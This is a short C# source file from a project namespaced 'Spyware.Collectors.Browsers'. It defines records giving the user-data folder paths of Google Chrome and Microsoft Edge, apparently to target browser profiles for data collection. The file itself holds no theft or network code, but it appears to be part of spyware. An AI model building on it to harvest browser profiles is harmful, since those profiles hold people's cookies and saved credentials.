namespace Spyware.Collectors.Browsers;

public sealed record BrowserDefinition(string Id, string DisplayName, string RelativeUserDataPath)
{
    public static BrowserDefinition Chrome { get; } =
        new("chrome", "Google Chrome", @"Google\Chrome\User Data");

    public static BrowserDefinition Edge { get; } =
        new("edge", "Microsoft Edge", @"Microsoft\Edge\User Data");

    public static IReadOnlyList<BrowserDefinition> All { get; } = new[] { Chrome, Edge };
}
